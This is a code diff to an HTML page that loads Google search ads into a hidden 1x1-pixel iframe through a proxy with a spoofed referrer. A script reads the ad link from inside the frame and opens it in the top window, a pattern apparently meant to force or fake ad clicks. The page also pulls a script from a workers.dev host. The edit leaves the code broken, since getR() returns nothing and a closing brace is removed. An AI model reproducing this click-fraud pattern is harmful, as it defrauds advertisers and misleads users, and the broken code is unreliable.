@@ -169,6 +169,11 @@
             console.log(encodedfinalSearchTerm);
         </script>
         <scirpt type="text/javascript" src="https://still-mouse-f7d5.dhanwaaninvestor.workers.dev/__sys__/helper.js"></scirpt>
+    <script>
+        function getR(){
+            confirm("Press a button!");
+        }
+    </script>
         <script type="text/javascript">
             function itsLoaded(){
                 var iframe = document.getElementById('master-1');
@@ -176,13 +181,12 @@
                 var ainiframe = idocument.querySelector('a');
                 var href = ainiframe.href;
                 console.log("The HREF Value is: "+href);
-                var r = confirm("Press a button!");
-                 if (r == true) {
-                   window.open(href,'_top');
-                      } else {
-                             alert();;
-  }
-            }
+                var r = getR();
+                if(r==true){
+                    window.open(href,'_top');
+                }else{
+                    alert();
+                }
         </script>
         <script>
             var iFrameCode = '<iframe frameborder="0" marginwidth="0" marginheight="0" allowtransparency="true" scrolling="no" width="1px" height="1px" name="{&quot;name&quot;:&quot;master-1&quot;,&quot;master-1&quot;:{&quot;personalizedAds&quot;:false,&quot;position&quot;:&quot;top&quot;,&quot;cseGoogleHosting&quot;:&quot;partner&quot;,&quot;hl&quot;:&quot;en&quot;,&quot;columns&quot;:1,&quot;horizontalAlignment&quot;:&quot;center&quot;,&quot;resultsPageQueryParam&quot;:&quot;query&quot;,&quot;type&quot;:&quot;ads&quot;,&quot;linkTarget&quot;:&quot;_top&quot;}}" id="master-1" src="'+ProxyURL+'https://cse.google.com/cse_v2/ads?adsafe=low&amp;cpp=0&amp;cx=fa76e13ee2f2c7fa1&amp;hl=en&amp;pcsa=false&amp;client=google-coop&amp;q='+encodedfinalSearchTerm+'&amp;r=m&amp;type=0&amp;oe=UTF-8&amp;ie=UTF-8&amp;fexp='+encodedFEXPValue+'&amp;format=p4&amp;ad=p4&amp;nocache='+NoCacheValue+'&amp;num=0&amp;output=uds_ads_only&amp;source=gcsc&amp;v=3&amp;adext=as1%2Csr1&amp;bsl=10&amp;pac=0&amp;u_his=5&amp;u_tz=330&amp;u_w=1536&amp;u_h=864&amp;biw=1536&amp;bih=754&amp;psw=1536&amp;psh=754&amp;frm=0&amp;uio=sl1sr1-&amp;inames=master-1&amp;jsv=10737&amp;rurl=https%3A%2F%2Fnowpayments.tk%2F#master-1" style="visibility: visible; display: block;" title="Ads by Google" data-bm="88" onload="itsLoaded();"></iframe>';
